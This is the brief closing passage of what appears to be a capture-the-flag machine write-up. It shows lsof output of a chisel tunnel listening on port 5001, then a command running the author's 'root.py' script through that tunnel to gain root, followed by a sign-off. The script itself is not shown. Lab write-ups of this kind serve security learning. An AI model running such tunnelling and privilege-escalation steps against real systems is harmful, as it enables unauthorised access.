COMMAND  PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
chisel  6499 user    6u  IPv4 10349808      0t0  TCP *:5001 (LISTEN)
```

[**code**](https://github/0xN1ghtR1ngs)
```
$ python3 root.py -i 127.0.0.1 -p 5001
```
![website](/assets/img/Posts/root-flag.png)

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !

